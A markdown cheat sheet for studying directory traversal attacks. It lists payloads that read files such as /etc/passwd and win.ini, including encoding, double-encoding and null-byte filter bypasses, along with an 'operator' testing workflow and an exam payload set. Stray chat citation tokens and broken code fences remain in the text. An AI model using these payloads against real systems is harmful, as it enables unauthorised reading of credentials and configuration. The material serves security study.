
---

``md
> [!ABSTRACT]
> Directory Traversal (Path Traversal) is a vulnerability that allows attackers to **access files outside the intended directory** by manipulating file path inputs.  
> 
> It happens when:
> - User input is used to build file paths  
> - Input is not properly validated/sanitized  
> - The app allows directory navigation (`../`)  
> 
> Attackers use sequences like `../` to move up directories and access sensitive files like `/etc/passwd`. :contentReference[oaicite:0]{index=0}  
> 
> Impact:
> - Read sensitive files (configs, credentials)  
> - Access source code  
> - Sometimes write/modify files → full compromise :contentReference[oaicite:1]{index=1}  
> 
> 🧠 Think: “You’re escaping the app’s folder and reading the whole server”

---

## 🧠 Directory Traversal – Cheat Sheet

---

### 🎯 1. Basic Detection (Traversal Test)

> [!CHECK]
> Test if app allows directory traversal  
> Look for file disclosure  

```bash
../../../etc/passwd
````

```bash
../../../../etc/passwd
```

---

### 🧪 2. Common File Targets

> [!SUCCESS]  
> Retrieve sensitive system files

```bash
/etc/passwd
```

```bash
/etc/hostname
```

```bash
C:\Windows\win.ini
```

---

### 🧬 3. URL-Based Injection

> [!SUCCESS]  
> Inject into file parameter

```bash
/loadImage?filename=../../../etc/passwd
```

---

### 🧩 4. Encoding Bypass

> [!ATTENTION]  
> Bypass filters using encoding

```bash
%2e%2e%2f%2e%2e%2fetc/passwd
```

```bash
..%2f..%2f..%2fetc/passwd
```

---

### 🧪 5. Double Encoding Bypass

> [!ATTENTION]  
> Bypass filters that decode once

```bash
%252e%252e%252f%252e%252e%252fetc/passwd
```

---

### 💥 6. Absolute Path Bypass

> [!ATTENTION]  
> Try full path instead of traversal

```bash
/etc/passwd
```

```bash
C:\Windows\win.ini
```

---

### ⚙️ 7. Null Byte Bypass

> [!ATTENTION]  
> Bypass extension restrictions

```bash
../../../etc/passwd%00.jpg
```

---

### 🧪 8. Traversal Variations

> [!ATTENTION]  
> Different OS / filter bypasses

```bash
..\..\..\etc\passwd
```

```bash
....//....//etc/passwd
```

---

### 💣 9. File Inclusion Context

> [!SUCCESS]  
> Used in LFI/RFI scenarios

```bash
?page=../../../etc/passwd
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Identify file parameter:
    

```bash
?file=test.jpg
```

2. Inject traversal:
    

```bash
../../../etc/passwd
```

3. If blocked → try encoding:
    

```bash
%2e%2e%2fetc/passwd
```

4. Try absolute path:
    

```bash
/etc/passwd
```

5. Extract useful data
    

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- File download endpoints
    
- Image loaders
    
- PDF generators
    
- Template loaders
    
- API file parameters
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
../../../etc/passwd
../../../../etc/passwd
%2e%2e%2fetc/passwd
%252e%252e%252fetc/passwd
/etc/passwd
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Input sanitized
>     
> - Path normalized
>     
> - Access restricted
>     

---

> [!ATTENTION]  
> Traversal relies on:
> 
> - User-controlled file path
>     
> - Weak validation
>     
> 
> No file parameter → no vulnerability

---

```

---

## 🔥 Key Insight (important for you)

- Directory Traversal is often:
  - The **entry point** to LFI  
  - Used to **find credentials/configs**
- Very common in:
  - Image/file loading features  
  - Download endpoints  

---


::contentReference[oaicite:2]{index=2}
```